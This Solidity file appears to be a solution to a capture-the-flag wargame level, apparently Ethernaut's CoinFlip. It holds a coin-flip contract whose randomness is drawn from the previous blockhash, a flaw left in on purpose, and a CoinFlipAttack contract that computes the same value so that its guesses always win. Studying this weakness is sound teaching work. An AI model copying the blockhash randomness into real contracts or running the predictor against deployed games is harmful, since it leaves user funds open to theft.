// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address public winner;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      winner= msg.sender;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }

  function getWinner()public  view returns (address){
    return winner;
  }
  function getconsecutiveWins()public  view returns (uint256){
    return consecutiveWins;
  }
}
contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(address _victim) public returns (bool) {
    CoinFlip coinflip = CoinFlip(_victim);
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
    return side;
  }
}
